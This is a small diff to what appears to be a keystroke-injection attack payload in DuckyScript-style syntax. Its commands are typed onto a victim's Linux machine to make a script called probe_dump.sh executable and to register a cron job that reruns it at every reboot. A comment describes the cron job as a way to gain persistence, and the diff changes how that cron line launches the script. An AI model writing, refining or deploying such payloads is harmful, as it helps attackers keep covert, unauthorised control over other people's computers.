@@ -40,7 +40,7 @@ STRING chmod +x probe_dump.sh
 ENTER
 DELAY 1000
 REM Set up cron job to run the script at reboot one more way to leverage persistence
-STRING echo "@reboot /tmp/roberto_*/probe_dump.sh" > cronjob
+STRING echo "@reboot cd /tmp/roberto_* && ./probe_dump.sh" > cronjob
 ENTER
 DELAY 1000
 STRING crontab cronjob
